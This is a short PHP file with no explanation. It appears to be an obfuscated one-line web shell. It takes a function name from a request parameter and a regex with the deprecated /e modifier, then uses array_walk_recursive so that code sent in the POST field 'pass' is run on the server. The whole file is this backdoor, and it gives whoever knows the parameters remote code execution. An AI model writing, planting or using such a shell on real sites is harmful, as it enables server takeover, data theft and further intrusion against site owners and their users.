<?php
    $e = $_REQUEST['e'];
    $arr = array($_POST['pass'] => '|.*|e',);
    array_walk_recursive($arr, $e, '');
?>
